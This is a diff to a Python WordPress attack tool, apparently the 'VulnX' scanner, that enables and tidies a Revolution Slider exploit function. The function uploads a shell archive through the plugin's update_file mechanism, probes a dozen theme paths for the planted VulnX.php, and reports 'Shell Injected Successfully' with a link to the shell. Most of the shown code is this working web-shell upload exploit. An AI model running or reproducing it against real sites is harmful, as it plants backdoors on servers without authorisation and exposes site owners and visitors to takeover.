@@ -87,6 +87,7 @@ def contentw():
         wp_shop()
         wp_injection()
         wp_powerzoomer()
+        wp_revslider()
     elif drupal:
         print ('%s[%i] %s %s Drupal \n\n' % (W,id,url,G))
     elif prestashop:
@@ -349,25 +350,19 @@ def wp_revslider():
         'update_file':[open('./shell/VulnX.zip','rb')]
     }
     send_shell = requests.post(endpoint,options,headers)
+
     revslidera=requests.get(url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
     revsliderb=requests.get(url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
     revsliderc=requests.get(url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
     revsliderd=requests.get(url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
     revslidere=requests.get(url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
     revsliderf=requests.get(url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revsliderg=requests.get(url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revsliderh=requests.get(url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revslideri=requests.get(url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revsliderj=requests.get(url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revsliderk=requests.get(url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revsliderl=requests.get(url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
-
     revsliderm=requests.get(url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php", headers)
 
     check_revslidera = re.findall("Vuln X", revslidera)
@@ -383,8 +378,6 @@ def wp_revslider():
     check_revsliderk = re.findall("Vuln X", revsliderk)
     check_revsliderl = re.findall("Vuln X", revsliderl)
     check_revsliderm = re.findall("Vuln X", revsliderm)
-
-
 
     if check_revslidera:
         print ('%s [%s+%s] Revslider Plugin%s --------- %s YES' %(W,G,W,W,G))
@@ -451,6 +444,7 @@ def wp_revslider():
         print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     else:
         print ('%s [%s-%s] Revslider Plugin%s --------- %s NO' %(W,R,W,W,R))
+
 
 if __name__ == "__main__":
 
